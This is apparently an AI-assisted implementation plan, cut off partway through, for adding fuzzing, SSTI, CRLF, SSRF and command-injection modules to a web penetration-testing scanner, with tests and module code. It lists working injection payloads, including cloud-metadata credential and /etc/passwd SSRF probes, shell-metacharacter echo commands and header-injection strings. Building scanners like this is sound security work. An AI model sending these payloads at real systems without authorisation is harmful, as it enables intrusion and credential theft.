# Generic Fuzzing / Injection Modules — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Six new generic attack modules (fuzz, ssti, crlf, ssrf, cmdi, nosqli), each a `PayloadGenerator` + `Validator` + `AttackModule` with its own detection oracle, wired through the existing analyze→generate→send→validate→Report pipeline.

**Architecture:** Each module follows the existing `sqli.py` pattern (module-level payload/signature constants, generator yielding `TestCase`s, validator returning `Finding | None`, an `AttackModule`). New `AttackType`s + analyzer `ClassificationRule`s (so points get tagged) + registration into `BUILTIN_MODULES`. A shared `GENERIC_ERROR_SIGNATURES` set + `error_signature` helper in `_common.py`.

**Tech Stack:** Python 3.11+, stdlib `re`/`uuid`, pytest.

## Global Constraints

- Python 3.11+; `from __future__ import annotations` in every new module.
- Follow the existing module pattern EXACTLY (see `penpine/attack/modules/sqli.py`): payloads/signatures as extendable module-level constants; generator ctor takes `payloads=None`; validator ctor takes `signatures=None`; `AttackModule(name, gen, val, attack_type=, applies_to=, description=)`.
- `Finding(attack_type, point, payload, confidence, evidence, request=test_case.request, response=response)`. `Confidence.{LOW,MEDIUM,HIGH}`.
- Validators receive `baseline` and MUST suppress a signal that also appears in the baseline (false-positive control), like `SqliValidator`.
- Attacks are opt-in: modules only run when the operator selects that `AttackType`. Register into `BUILTIN_MODULES` (NOT `DIFFERENTIAL_MODULES`).
- Each module task appends: its analyzer rule to `DEFAULT_RULES` (except ssrf — reuses existing rules), its module to `BUILTIN_MODULES`, and its import to `modules/__init__.py`.
- Ruff lint + format gating; mypy advisory. Commit with `git commit --no-gpg-sign`.
- Tests mirror `tests/attack/modules/test_sqli.py`: `InjectionPoint("param:x","param","x",value)` for points, `parse_response(bytes)` for responses; plus an end-to-end `Runner` test with `FakeSender` (from `tests/attack/_fakes.py`).

## File Structure
- NEW: `penpine/attack/modules/{fuzz,ssti,crlf,ssrf,cmdi,nosqli}.py`; `tests/attack/modules/test_{fuzz,ssti,crlf,ssrf,cmdi,nosqli}.py`.
- MODIFY: `penpine/attack/types.py` (Task 1); `penpine/attack/modules/_common.py` (Task 1); `penpine/attack/analyze/rules.py` (Tasks 2-4,6,7); `penpine/attack/modules/__init__.py` (Tasks 2-7).

---

### Task 1: new AttackTypes + shared error signatures

**Files:**
- Modify: `penpine/attack/types.py`, `penpine/attack/modules/_common.py`
- Test: `tests/attack/test_types.py`, `tests/attack/modules/test_common.py`

**Interfaces:**
- Produces: `AttackType.{FUZZ, SSTI, CRLF, CMDI, NOSQLI}`; `_common.GENERIC_ERROR_SIGNATURES` (list of compiled regexes); `_common.error_signature(response, baseline, signatures) -> re.Match | None`.

- [ ] **Step 1: Write the failing tests**

Append to `tests/attack/test_types.py`:
```python
def test_new_generic_attack_types_exist_and_roundtrip():
    from penpine.attack.types import AttackType

    for name, value in [
        ("FUZZ", "fuzz"), ("SSTI", "ssti"), ("CRLF", "crlf"),
        ("CMDI", "cmdi"), ("NOSQLI", "nosqli"),
    ]:
        assert AttackType[name].value == value
        assert AttackType.from_str(value) is AttackType[name]
```
Append to `tests/attack/modules/test_common.py`:
```python
def test_error_signature_matches_and_suppresses_baseline():
    from penpine.attack.modules._common import GENERIC_ERROR_SIGNATURES, error_signature
    from penpine.core.parse.http_parser import parse_response

    def r(body):
        return parse_response(b"HTTP/1.1 200 OK\r\nContent-Length: %d\r\n\r\n%s" % (len(body), body))

    err = r(b"Traceback (most recent call last): File x")
    assert error_signature(err, None, GENERIC_ERROR_SIGNATURES) is not None
    # same signature already in baseline -> not attributable
    assert error_signature(err, err, GENERIC_ERROR_SIGNATURES) is None
    assert error_signature(r(b"all good"), None, GENERIC_ERROR_SIGNATURES) is None
```

- [ ] **Step 2: Run to verify they fail**

Run: `pytest tests/attack/test_types.py tests/attack/modules/test_common.py -q`
Expected: FAIL (`KeyError: 'FUZZ'` / `ImportError: error_signature`).

- [ ] **Step 3: Add the AttackTypes**

In `penpine/attack/types.py`, add to the `AttackType` enum (after `BROKEN_ACCESS`):
```python
    FUZZ = "fuzz"
    SSTI = "ssti"
    CRLF = "crlf"
    CMDI = "cmdi"
    NOSQLI = "nosqli"
```

- [ ] **Step 4: Add the shared error signatures + helper**

In `penpine/attack/modules/_common.py`, add `import re` at the top (if absent) and append:
```python
GENERIC_ERROR_SIGNATURES = [
    re.compile(pattern, re.I)
    for pattern in [
        r"Traceback \(most recent call last\)",
        r"Fatal error:",
        r"Stack trace:",
        r"java\.lang\.[A-Za-z.]+(Exception|Error)",
        r"at [\w.$]+\([\w.]+\.java:\d+\)",
        r"System\.[A-Za-z.]+Exception",
        r"Microsoft OLE DB Provider",
        r"Internal Server Error",
        r"(Syntax|Reference|Type)Error:",
        r"undefined method ['`].*['`] for",
        r"ORA-\d{5}",
        r"SQLSTATE\[",
        r"Warning: \w+\(\).* in ",
        r"Uncaught (?:Error|Exception)",
    ]
]


def error_signature(response, baseline, signatures):
    """First signature present in the response but NOT the baseline (or None)."""
    match = search_signatures(body_text(response), signatures)
    if match is None:
        return None
    if baseline is not None and search_signatures(body_text(baseline), signatures):
        return None
    return match
```

- [ ] **Step 5: Run to verify they pass**

Run: `pytest tests/attack/test_types.py tests/attack/modules/test_common.py -q`
Expected: PASS.

- [ ] **Step 6: Lint + commit**

Run: `ruff check penpine/attack/types.py penpine/attack/modules/_common.py tests/attack/test_types.py tests/attack/modules/test_common.py && ruff format penpine/attack/types.py penpine/attack/modules/_common.py tests/attack/test_types.py tests/attack/modules/test_common.py`
```bash
git add penpine/attack/types.py penpine/attack/modules/_common.py tests/attack/test_types.py tests/attack/modules/test_common.py
git commit --no-gpg-sign -m "feat(attack): add FUZZ/SSTI/CRLF/CMDI/NOSQLI types + shared error signatures

Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>"
```

---

### Task 2: fuzz module

**Files:**
- Create: `penpine/attack/modules/fuzz.py`
- Modify: `penpine/attack/analyze/rules.py`, `penpine/attack/modules/__init__.py`
- Test: `tests/attack/modules/test_fuzz.py`

**Interfaces:**
- Consumes: Task 1 types + `error_signature`/`GENERIC_ERROR_SIGNATURES`.
- Produces: `FUZZ_PAYLOADS`, `FuzzGenerator`, `FuzzValidator`, `FUZZ_MODULE`; `FuzzRule` in `DEFAULT_RULES`; `FUZZ_MODULE` in `BUILTIN_MODULES`.

- [ ] **Step 1: Write the failing test**

Create `tests/attack/modules/test_fuzz.py`:
```python
from penpine.attack.models import InjectionPoint
from penpine.attack.modules.fuzz import FUZZ_PAYLOADS, FuzzGenerator, FuzzValidator
from penpine.attack.types import AttackType
from penpine.core.parse.http_parser import parse_response


def pt(value="hi"):
    return InjectionPoint("param:x", "param", "x", value)


def resp(body=b"ok", status=200):
    line = {200: b"200 OK", 500: b"500 Internal Server Error", 404: b"404 Not Found"}[status]
    return parse_response(b"HTTP/1.1 " + line + b"\r\nContent-Length: %d\r\n\r\n%s" % (len(body), body))


def test_generator_yields_all_fuzz_payloads():
    tcs = list(FuzzGenerator().generate(pt(), None))
    assert [c.payload.value for c in tcs] == FUZZ_PAYLOADS
    assert all(c.attack_type == AttackType.FUZZ for c in tcs)


def test_validator_flags_5xx_high():
    tc = next(iter(FuzzGenerator().generate(pt(), None)))
    f = FuzzValidator().evaluate(tc, resp(status=500), baseline=resp(status=200))
    assert f is not None and f.confidence.name == "HIGH" and f.attack_type == AttackType.FUZZ


def test_validator_flags_error_signature_high():
    tc = next(iter(FuzzGenerator().generate(pt(), None)))
    f = FuzzValidator().evaluate(tc, resp(b"Traceback (most recent call last):"), baseline=resp(b"ok"))
    assert f is not None and f.confidence.name == "HIGH"


def test_validator_flags_status_change_medium():
    tc = next(iter(FuzzGenerator().generate(pt(), None)))
    f = FuzzValidator().evaluate(tc, resp(status=404), baseline=resp(status=200))
    assert f is not None and f.confidence.name == "MEDIUM"


def test_validator_suppresses_when_baseline_also_5xx():
    tc = next(iter(FuzzGenerator().generate(pt(), None)))
    assert FuzzValidator().evaluate(tc, resp(status=500), baseline=resp(status=500)) is None


def test_validator_benign_returns_none():
    tc = next(iter(FuzzGenerator().generate(pt(), None)))
    assert FuzzValidator().evaluate(tc, resp(b"ok"), baseline=resp(b"ok")) is None
```

- [ ] **Step 2: Run to verify it fails**

Run: `pytest tests/attack/modules/test_fuzz.py -q`
Expected: FAIL (`ModuleNotFoundError: penpine.attack.modules.fuzz`).

- [ ] **Step 3: Create `penpine/attack/modules/fuzz.py`**

```python
"""Generic edge/type-value fuzzing with error/anomaly detection."""

from __future__ import annotations

import uuid as _uuid

from penpine.attack.generator import PayloadGenerator
from penpine.attack.models import Confidence, Finding, Payload, TestCase
from penpine.attack.module import AttackModule
from penpine.attack.modules._common import GENERIC_ERROR_SIGNATURES, error_signature
from penpine.attack.types import AttackType
from penpine.attack.validator import Validator

FUZZ_PAYLOADS = [
    "null", "none", "", "0", "1", "-1", "true", "false", "NaN", "Infinity",
    str(_uuid.uuid4()), str(2**63), str(-(2**63)), str(2**63 - 1), "1e308", "-1e308",
    "1" * 33000, "%n%n%n", "{{7*7}}", "[]", "{}", "$(:)", "\r\n", "\x00", "../",
    "🌀", "' OR ''='", "<x>", "-0", "0x1f", "1;", "   ", "9" * 40, "%00", "￿",
]


def _status(obj) -> int:
    return getattr(obj, "status_code", 0) or 0


def _blen(obj) -> int:
    return len(getattr(obj, "body", b"") or b"")


class FuzzGenerator(PayloadGenerator):
    def __init__(self, payloads=None):
        self._payloads = list(payloads) if payloads is not None else list(FUZZ_PAYLOADS)

    def generate(self, point, request):
        for value in self._payloads:
            yield TestCase(
                point=point, payload=Payload(value, technique="fuzz"), attack_type=AttackType.FUZZ
            )


class FuzzValidator(Validator):
    def __init__(self, signatures=None):
        self._signatures = (
            list(signatures) if signatures is not None else list(GENERIC_ERROR_SIGNATURES)
        )

    def _finding(self, test_case, response, confidence, evidence):
        return Finding(
            AttackType.FUZZ, test_case.point, test_case.payload, confidence, evidence,
            request=test_case.request, response=response,
        )

    def evaluate(self, test_case, response, baseline=None):
        status = _status(response)
        if status >= 500 and _status(baseline) < 500:
            return self._finding(test_case, response, Confidence.HIGH, f"server error status {status}")
        match = error_signature(response, baseline, self._signatures)
        if match is not None:
            return self._finding(
                test_case, response, Confidence.HIGH, f"error signature: {match.group(0)[:80]}"
            )
        if baseline is not None:
            b_status = _status(baseline)
            if status >= 400 and status // 100 != b_status // 100:
                return self._finding(
                    test_case, response, Confidence.MEDIUM, f"status change {b_status} -> {status}"
                )
            bl, rl = _blen(baseline), _blen(response)
            if bl and (rl >= 3 * bl or rl * 3 <= bl):
                return self._finding(
                    test_case, response, Confidence.MEDIUM, f"response size {bl} -> {rl} bytes"
                )
        return None


FUZZ_MODULE = AttackModule(
    "fuzz",
    FuzzGenerator(),
    FuzzValidator(),
    attack_type=AttackType.FUZZ,
    applies_to=(),  # all injectable kinds
    description="generic edge/type-value fuzzing (error & anomaly detection)",
)
```

- [ ] **Step 4: Add `FuzzRule` to the analyzer**

In `penpine/attack/analyze/rules.py`, add a rule class (after the existing rules, before `DEFAULT_RULES`):
```python
class FuzzRule(ClassificationRule):
    name = "fuzz"

    def match(self, point) -> set:
        return {AttackType.FUZZ}
```
and append `FuzzRule()` to the `DEFAULT_RULES` list.

- [ ] **Step 5: Register the module + relax the count assertion**

In `penpine/attack/modules/__init__.py`: add
```python
from penpine.attack.modules.fuzz import FUZZ_MODULE, FUZZ_PAYLOADS, FuzzGenerator, FuzzValidator
```
and add `FUZZ_MODULE` to `BUILTIN_MODULES`. Add the four names to `__all__` if the file curates one.

Then relax the now-stale exact-count assertion in `tests/attack/modules/test_registration.py`:
change `assert len(BUILTIN_MODULES) == 4` → `assert len(BUILTIN_MODULES) >= 4` (it grows as
each generic module is added; Task 7 adds a precise "all six present" test). Run
`pytest tests/attack/modules/test_registration.py -q` to confirm it passes.

- [ ] **Step 6: Add an end-to-end Runner test**

Append to `tests/attack/modules/test_fuzz.py`:
```python
async def test_fuzz_runs_end_to_end_and_finds_error():
    from penpine.attack.runner import Runner
    from penpine.attack.modules import register_builtins
    from penpine.attack import registry
    from penpine.core.message import Request
    from tests.attack._fakes import FakeSender

    registry.clear()
    register_builtins()
    try:
        # baseline 200, then every fuzz payload gets a 500
        script = [b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok",
                  b"HTTP/1.1 500 Internal Server Error\r\nContent-Length: 3\r\n\r\nerr"]
        report = await Runner(sender=FakeSender(script)).run(
            Request.from_url("http://h/?q=hi"), attack=AttackType.FUZZ
        )
        assert report.findings
    finally:
        registry.clear()
```
(If `tests/attack/modules/` needs the import path, `from tests.attack._fakes import FakeSender` works because tests run from the repo root; match how `tests/attack/test_runner.py` imports it — mirror that exact import.)

- [ ] **Step 7: Run + lint + commit**

Run: `pytest tests/attack/modules/test_fuzz.py tests/attack/analyze -q && ruff check penpine/attack/modules/fuzz.py penpine/attack/analyze/rules.py penpine/attack/modules/__init__.py tests/attack/modules/test_fuzz.py && ruff format <same files>`
Expected: PASS; ruff clean.
```bash
git add penpine/attack/modules/fuzz.py penpine/attack/analyze/rules.py penpine/attack/modules/__init__.py tests/attack/modules/test_fuzz.py
git commit --no-gpg-sign -m "feat(attack): generic fuzz module (edge/type values + error/anomaly detection)

Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>"
```

---

### Task 3: ssti module

**Files:** Create `penpine/attack/modules/ssti.py`; modify `rules.py`, `modules/__init__.py`; test `tests/attack/modules/test_ssti.py`.

**Interfaces:** Produces `SSTI_TEMPLATES`, `SstiGenerator`, `SstiValidator`, `SSTI_MODULE`; `TemplateInjectionRule` in `DEFAULT_RULES`; `SSTI_MODULE` in `BUILTIN_MODULES`.

- [ ] **Step 1: Write the failing test**

Create `tests/attack/modules/test_ssti.py`:
```python
from penpine.attack.models import InjectionPoint
from penpine.attack.modules.ssti import SstiGenerator, SstiValidator
from penpine.attack.types import AttackType
from penpine.core.parse.http_parser import parse_response


def pt(value="hi"):
    return InjectionPoint("param:x", "param", "x", value)


def resp(body):
    return parse_response(b"HTTP/1.1 200 OK\r\nContent-Length: %d\r\n\r\n%s" % (len(body), body))


def test_generator_embeds_product_and_expression_in_meta():
    tcs = list(SstiGenerator().generate(pt(), None))
    assert tcs and all(c.attack_type == AttackType.SSTI for c in tcs)
    tc = tcs[0]
    assert "product" in tc.payload.meta and "expr" in tc.payload.meta
    assert str(tc.payload.meta["product"]) not in tc.payload.value  # the literal isn't the product


def test_validator_detects_evaluated_product():
    tc = next(iter(SstiGenerator().generate(pt(), None)))
    product = tc.payload.meta["product"]
    f = SstiValidator().evaluate(tc, resp(f"result: {product} done".encode()), None)
    assert f is not None and f.confidence.name == "HIGH" and f.attack_type == AttackType.SSTI


def test_validator_ignores_reflected_expression_without_eval():
    tc = next(iter(SstiGenerator().generate(pt(), None)))
    # the raw expression echoed back (not evaluated) -> not a finding
    assert SstiValidator().evaluate(tc, resp(tc.payload.value.encode()), None) is None


def test_validator_benign_returns_none():
    tc = next(iter(SstiGenerator().generate(pt(), None)))
    assert SstiValidator().evaluate(tc, resp(b"nothing here"), None) is None
```

- [ ] **Step 2: Run to verify it fails**

Run: `pytest tests/attack/modules/test_ssti.py -q`  → FAIL (module missing).

- [ ] **Step 3: Create `penpine/attack/modules/ssti.py`**

```python
"""Generic server-side template injection (arithmetic-eval oracle)."""

from __future__ import annotations

import secrets

from penpine.attack.generator import PayloadGenerator
from penpine.attack.models import Confidence, Finding, Payload, TestCase
from penpine.attack.module import AttackModule
from penpine.attack.modules._common import body_text
from penpine.attack.types import AttackType
from penpine.attack.validator import Validator

# each template takes two integers a, b; the response should contain a*b if evaluated
SSTI_TEMPLATES = ["{{%d*%d}}", "${%d*%d}", "#{%d*%d}", "<%%= %d*%d %%>", "${{%d*%d}}", "@(%d*%d)"]


class SstiGenerator(PayloadGenerator):
    def __init__(self, templates=None):
        self._templates = list(templates) if templates is not None else list(SSTI_TEMPLATES)

    def generate(self, point, request):
        for tmpl in self._templates:
            a = secrets.randbelow(9000) + 1000
            b = secrets.randbelow(9000) + 1000
            expr = tmpl % (a, b)
            yield TestCase(
                point=point,
                payload=Payload(expr, technique="ssti", meta={"product": a * b, "expr": expr}),
                attack_type=AttackType.SSTI,
            )


class SstiValidator(Validator):
    def evaluate(self, test_case, response, baseline=None):
        meta = test_case.payload.meta
        product, expr = meta.get("product"), meta.get("expr", test_case.payload.value)
        if product is None:
            return None
        text = body_text(response)
        if str(product) in text and expr not in text:
            return Finding(
                AttackType.SSTI, test_case.point, test_case.payload, Confidence.HIGH,
                f"template expression evaluated to {product}",
                request=test_case.request, response=response,
            )
        return None


SSTI_MODULE = AttackModule(
    "ssti",
    SstiGenerator(),
    SstiValidator(),
    attack_type=AttackType.SSTI,
    applies_to=("param", "form", "json", "multipart"),
    description="server-side template injection (eval oracle)",
)
```

- [ ] **Step 4: Add `TemplateInjectionRule`**

In `rules.py`, add and append to `DEFAULT_RULES`:
```python
class TemplateInjectionRule(ClassificationRule):
    name = "template-injection"

    def match(self, point) -> set:
        if point.kind in _BODY_KINDS and not is_empty(point.value) and not is_numeric(point.value):
            return {AttackType.SSTI}
        if _name(point) in _SEARCH_NAMES:
            return {AttackType.SSTI}
        return set()
```

- [ ] **Step 5: Register** — import `SSTI_MODULE, SSTI_TEMPLATES, SstiGenerator, SstiValidator` in `modules/__init__.py`; add `SSTI_MODULE` to `BUILTIN_MODULES`.

- [ ] **Step 6: End-to-end Runner test** — append to `test_ssti.py` (mirror Task 2's e2e): baseline `ok`, then a response echoing the product for an SSTI point (`?q=hi`); assert `report.findings`. Use a `FakeSender` whose script computes the product — simplest: a callable that, given the request, extracts the `a*b` from the sent expression and returns it. To keep it deterministic, instead run the validator path via a scripted response is hard (random a,b). So for the e2e test, register builtins and assert the run completes and sends >0 for `attack=AttackType.SSTI` (a full finding requires reflecting the exact product, which a static FakeSender can't know). Assert: `report.summary()["sent"] > 0` and no exceptions. (True-positive detection is covered by the validator unit test in Step 1.)

- [ ] **Step 7: Run + lint + commit** (`ruff` the touched files; commit message `feat(attack): generic SSTI module (template-injection eval oracle)`).

---

### Task 4: crlf module

**Files:** Create `penpine/attack/modules/crlf.py`; modify `rules.py`, `modules/__init__.py`; test `tests/attack/modules/test_crlf.py`.

**Interfaces:** `CRLF_TEMPLATES`, `CrlfGenerator`, `CrlfValidator`, `CRLF_MODULE`; `CrlfRule` in `DEFAULT_RULES`; registered.

- [ ] **Step 1: Write the failing test**

Create `tests/attack/modules/test_crlf.py`:
```python
from penpine.attack.models import InjectionPoint
from penpine.attack.modules.crlf import CrlfGenerator, CrlfValidator, INJECTED_HEADER
from penpine.attack.types import AttackType
from penpine.core.parse.http_parser import parse_response


def pt(value="hi"):
    return InjectionPoint("param:x", "param", "x", value)


def test_generator_marks_payloads_with_marker():
    tcs = list(CrlfGenerator().generate(pt(), None))
    assert tcs and all(c.attack_type == AttackType.CRLF for c in tcs)
    assert all("marker" in c.payload.meta for c in tcs)


def test_validator_detects_injected_response_header():
    tc = next(iter(CrlfGenerator().generate(pt(), None)))
    m = tc.payload.meta["marker"]
    raw = b"HTTP/1.1 200 OK\r\n%s: %s\r\nContent-Length: 0\r\n\r\n" % (INJECTED_HEADER.encode(), m.encode())
    f = CrlfValidator().evaluate(tc, parse_response(raw), None)
    assert f is not None and f.confidence.name == "HIGH" and f.attack_type == AttackType.CRLF


def test_validator_no_injection_returns_none():
    tc = next(iter(CrlfGenerator().generate(pt(), None)))
    clean = parse_response(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok")
    assert CrlfValidator().evaluate(tc, clean, None) is None
```

- [ ] **Step 2: Run** → FAIL (module missing).

- [ ] **Step 3: Create `penpine/attack/modules/crlf.py`**

```python
"""Generic CRLF / HTTP response header injection."""

from __future__ import annotations

from penpine.attack.generator import PayloadGenerator
from penpine.attack.models import Confidence, Finding, Payload, TestCase
from penpine.attack.module import AttackModule
from penpine.attack.modules._common import marker
from penpine.attack.types import AttackType
from penpine.attack.validator import Validator

INJECTED_HEADER = "X-Penpine-Inj"

# each template embeds a fresh marker; the response should carry it as a real header
CRLF_TEMPLATES = [
    "%0d%0a{h}: {m}",
    "\r\n{h}: {m}",
    "%E5%98%8A%E5%98%8D{h}: {m}",  # unicode CR/LF that some parsers normalize
    "%0d%0aSet-Cookie: {h}={m}",
]


class CrlfGenerator(PayloadGenerator):
    def __init__(self, templates=None, header=INJECTED_HEADER):
        self._templates = list(templates) if templates is not None else list(CRLF_TEMPLATES)
        self._header = header

    def generate(self, point, request):
        for tmpl in self._templates:
            m = marker("crlfpp")
            value = tmpl.format(h=self._header, m=m)
            yield TestCase(
                point=point,
                payload=Payload(value, technique="crlf", meta={"marker": m}),
                attack_type=AttackType.CRLF,
            )


class CrlfValidator(Validator):
    def evaluate(self, test_case, response, baseline=None):
        m = test_case.payload.meta.get("marker")
        if not m:
            return None
        for name, value in response.headers.items():
            if m in name or m in value:
                return Finding(
                    AttackType.CRLF, test_case.point, test_case.payload, Confidence.HIGH,
                    f"CRLF-injected response header: {name}: {value}"[:120],
                    request=test_case.request, response=response,
                )
        return None


CRLF_MODULE = AttackModule(
    "crlf",
    CrlfGenerator(),
    CrlfValidator(),
    attack_type=AttackType.CRLF,
    applies_to=("param", "form", "json", "header"),
    description="CRLF / HTTP response header injection",
)
```

- [ ] **Step 4: Add `CrlfRule`** to `rules.py` + `DEFAULT_RULES`:
```python
class CrlfRule(ClassificationRule):
    name = "crlf"

    def match(self, point) -> set:
        if point.kind in {"param", "form", "json", "header"}:
            return {AttackType.CRLF}
        if _name(point) in _REDIRECT_NAMES:
            return {AttackType.CRLF}
        return set()
```

- [ ] **Step 5: Register** `CRLF_MODULE` (+ `INJECTED_HEADER`, `CRLF_TEMPLATES`, `CrlfGenerator`, `CrlfValidator`) and add to `BUILTIN_MODULES`.

- [ ] **Step 6: End-to-end Runner test** — mirror Task 2; a `FakeSender` callable that echoes the injected marker as a real header when it sees `X-Penpine-Inj` in the request; assert `report.findings`. (Or, like Task 3, assert `sent > 0` if reflecting the exact marker is impractical — but here the marker IS in the request, so a `reflect`-style callable that copies `crlfpp_*` into a response header is feasible; prefer the true-positive e2e.)

- [ ] **Step 7: Run + lint + commit** (`feat(attack): generic CRLF/header-injection module`).

---

### Task 5: ssrf module (reuses existing rules)

**Files:** Create `penpine/attack/modules/ssrf.py`; modify `modules/__init__.py` (NO rules.py change — SSRF points are already tagged by url/redirect/host/proxy rules); test `tests/attack/modules/test_ssrf.py`.

**Interfaces:** `SSRF_PAYLOADS`, `SSRF_SIGNATURES`, `SsrfGenerator`, `SsrfValidator`, `SSRF_MODULE`; registered.

- [ ] **Step 1: Write the failing test**

```python
from penpine.attack.models import InjectionPoint
from penpine.attack.modules.ssrf import SsrfGenerator, SsrfValidator
from penpine.attack.types import AttackType
from penpine.core.parse.http_parser import parse_response


def pt(value="http://example.com"):
    return InjectionPoint("param:url", "param", "url", value)


def resp(body):
    return parse_response(b"HTTP/1.1 200 OK\r\nContent-Length: %d\r\n\r\n%s" % (len(body), body))


def test_generator_yields_metadata_and_file_targets():
    values = [c.payload.value for c in SsrfGenerator().generate(pt(), None)]
    assert any("169.254.169.254" in v for v in values)
    assert any(v.startswith("file://") for v in values)
    assert all(c.attack_type == AttackType.SSRF for c in [*SsrfGenerator().generate(pt(), None)])


def test_validator_detects_metadata_signature_medium():
    tc = next(iter(SsrfGenerator().generate(pt(), None)))
    f = SsrfValidator().evaluate(tc, resp(b'{"ami-id":"ami-123","instance-id":"i-1"}'), baseline=resp(b"ok"))
    assert f is not None and f.confidence.name == "MEDIUM" and f.attack_type == AttackType.SSRF


def test_validator_detects_passwd_file_read():
    tc = next(iter(SsrfGenerator().generate(pt(), None)))
    f = SsrfValidator().evaluate(tc, resp(b"root:x:0:0:root:/root:/bin/bash"), baseline=resp(b"ok"))
    assert f is not None and f.attack_type == AttackType.SSRF


def test_validator_suppresses_signature_in_baseline():
    tc = next(iter(SsrfGenerator().generate(pt(), None)))
    b = resp(b"root:x:0:0:root:/root:/bin/bash")
    assert SsrfValidator().evaluate(tc, b, baseline=b) is None


def test_validator_benign_returns_none():
    tc = next(iter(SsrfGenerator().generate(pt(), None)))
    assert SsrfValidator().evaluate(tc, resp(b"ok"), baseline=resp(b"ok")) is None
```

- [ ] **Step 2: Run** → FAIL.

- [ ] **Step 3: Create `penpine/attack/modules/ssrf.py`**

```python
"""Generic best-effort SSRF probes (metadata / localhost / file:// reflection).

Detection is passive: it flags cloud-metadata / file-read signatures reflected in
the response. There is no out-of-band listener — for true OOB confirmation, point
`canary_host` at a collaborator domain and watch it externally.
"""

from __future__ import annotations

import re

from penpine.attack.generator import PayloadGenerator
from penpine.attack.models import Confidence, Finding, Payload, TestCase
from penpine.attack.module import AttackModule
from penpine.attack.modules._common import GENERIC_ERROR_SIGNATURES, error_signature, search_signatures, body_text
from penpine.attack.types import AttackType
from penpine.attack.validator import Validator

CANARY_HOST = "penpine-oob.example"

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://127.0.0.1/",
    "http://localhost/",
    "http://[::1]/",
    "file:///etc/passwd",
    f"http://{CANARY_HOST}/",
]

SSRF_SIGNATURES = [
    re.compile(p, re.I)
    for p in [
        r"\bami-id\b", r"\binstance-id\b", r"\biam/security-credentials\b",
        r"computeMetadata", r'"AccessKeyId"', r"root:x:0:0:", r"\bmeta-data\b",
    ]
]


class SsrfGenerator(PayloadGenerator):
    def __init__(self, payloads=None, canary_host=CANARY_HOST):
        if payloads is not None:
            self._payloads = list(payloads)
        else:
            self._payloads = [p.replace(CANARY_HOST, canary_host) for p in SSRF_PAYLOADS]

    def generate(self, point, request):
        for value in self._payloads:
            yield TestCase(
                point=point, payload=Payload(value, technique="ssrf"), attack_type=AttackType.SSRF
            )


class SsrfValidator(Validator):
    def __init__(self, signatures=None, error_signatures=None):
        self._signatures = list(signatures) if signatures is not None else list(SSRF_SIGNATURES)
        self._errors = (
            list(error_signatures) if error_signatures is not None else list(GENERIC_ERROR_SIGNATURES)
        )

    def evaluate(self, test_case, response, baseline=None):
        match = search_signatures(body_text(response), self._signatures)
        if match is not None:
            if baseline is not None and search_signatures(body_text(baseline), self._signatures):
                return None
            return Finding(
                AttackType.SSRF, test_case.point, test_case.payload, Confidence.MEDIUM,
                f"internal/metadata content reflected: {match.group(0)[:60]}",
                request=test_case.request, response=response,
            )
        err = error_signature(response, baseline, self._errors)
        if err is not None:
            return Finding(
                AttackType.SSRF, test_case.point, test_case.payload, Confidence.LOW,
                f"server-side fetch error: {err.group(0)[:60]}",
                request=test_case.request, response=response,
            )
        return None


SSRF_MODULE = AttackModule(
    "ssrf",
    SsrfGenerator(),
    SsrfValidator(),
    attack_type=AttackType.SSRF,
    applies_to=("param", "form", "json", "header"),
    description="best-effort SSRF (metadata/localhost/file reflection)",
)
```

- [ ] **Step 4: Register** `SSRF_MODULE` (+ constants/classes) in `modules/__init__.py`; add `SSRF_MODULE` to `BUILTIN_MODULES`. (No `rules.py` change.)

- [ ] **Step 5: End-to-end Runner test** — register builtins; a `FakeSender` returning metadata JSON for a `url` param point (`?url=http://x`); `attack=AttackType.SSRF`; assert `report.findings`.

- [ ] **Step 6: Run + lint + commit** (`feat(attack): best-effort generic SSRF module`).

---

### Task 6: cmdi module

**Files:** Create `penpine/attack/modules/cmdi.py`; modify `rules.py`, `modules/__init__.py`; test `tests/attack/modules/test_cmdi.py`.

**Interfaces:** `CMDI_TEMPLATES`, `CmdiGenerator`, `CmdiValidator`, `CMDI_MODULE`; `CommandInjectionRule` in `DEFAULT_RULES`; registered.

- [ ] **Step 1: Write the failing test**

```python
from penpine.attack.models import InjectionPoint
from penpine.attack.modules.cmdi import CmdiGenerator, CmdiValidator
from penpine.attack.types import AttackType
from penpine.core.parse.http_parser import parse_response


def pt(value="hi"):
    return InjectionPoint("param:x", "param", "x", value)


def resp(body):
    return parse_response(b"HTTP/1.1 200 OK\r\nContent-Length: %d\r\n\r\n%s" % (len(body), body))


def test_generator_marks_payloads():
    tcs = list(CmdiGenerator().generate(pt(), None))
    assert tcs and all(c.attack_type == AttackType.CMDI and "marker" in c.payload.meta for c in tcs)


def test_validator_detects_command_output_reflection():
    tc = next(iter(CmdiGenerator().generate(pt(), None)))
    m = tc.payload.meta["marker"]
    # command output (the bare marker) reflected, NOT the literal payload
    f = CmdiValidator().evaluate(tc, resp(f"output {m} end".encode()), None)
    assert f is not None and f.confidence.name == "HIGH" and f.attack_type == AttackType.CMDI


def test_validator_ignores_literal_payload_echo():
    tc = next(iter(CmdiGenerator().generate(pt(), None)))
    assert CmdiValidator().evaluate(tc, resp(tc.payload.value.encode()), None) is None


def test_validator_benign_returns_none():
    tc = next(iter(CmdiGenerator().generate(pt(), None)))
    assert CmdiValidator().evaluate(tc, resp(b"ok"), None) is None
```

- [ ] **Step 2: Run** → FAIL.

- [ ] **Step 3: Create `penpine/attack/modules/cmdi.py`**

```python
"""Generic OS command injection (command-output reflection oracle)."""

from __future__ import annotations

from penpine.attack.generator import PayloadGenerator
from penpine.attack.models import Confidence, Finding, Payload, TestCase
from penpine.attack.module import AttackModule
from penpine.attack.modules._common import GENERIC_ERROR_SIGNATURES, body_text, error_signature, marker
from penpine.attack.types import AttackType
from penpine.attack.validator import Validator

# each template runs `echo <marker>`; the bare marker in the body means execution
CMDI_TEMPLATES = [";echo {m}", "$(echo {m})", "`echo {m}`", "|echo {m}", "&&echo {m}", "\n echo {m}"]


